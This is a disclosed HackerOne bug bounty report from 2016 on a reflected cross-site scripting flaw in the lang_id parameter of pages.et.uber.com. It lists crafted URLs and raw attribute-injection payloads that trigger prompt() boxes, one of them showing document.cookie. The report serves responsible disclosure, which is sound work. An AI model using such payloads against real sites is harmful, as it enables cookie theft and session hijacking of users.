# XSS At "pages.et.uber.com"

## Report Details
- **Report ID**: 156098
- **URL**: https://hackerone.com/reports/156098
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-08-02T14:23:50.067Z
- **Disclosed**: 2016-08-19T17:32:23.081Z

## Reporter
- **Username**: raghav_bisht
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: uber

## Vulnerability Information
Vulnerable Domain :
-------------------
https://pages.et.uber.com/

Vulnerable Link :
-----------------
https://pages.et.uber.com/icecream/?lang_id=5


Edited Link With Payload :
--------------------------
https://pages.et.uber.com/icecream/?lang_id=5%22%20onmouseover%3dprompt(document.domain)%20bad%3d%22
https://pages.et.uber.com/icecream/?lang_id=5%22%20onmouseover%3dprompt(document.cookie)%20bad%3d%22
https://pages.et.uber.com/icecream/?lang_id=5%22%20onmouseover%3dprompt(9020)%20bad%3d%22


Payload Used :
--------------

" onmouseover%3dprompt(9020) bad%3d"
" onmouseover%3dprompt(document.domain) bad%3d"
" onmouseover%3dprompt(document.cookie) bad%3d"

## Attachments
- xss-1.JPG
- source.JPG
- xss-2.JPG
- xss-3.JPG
- xss-4.JPG
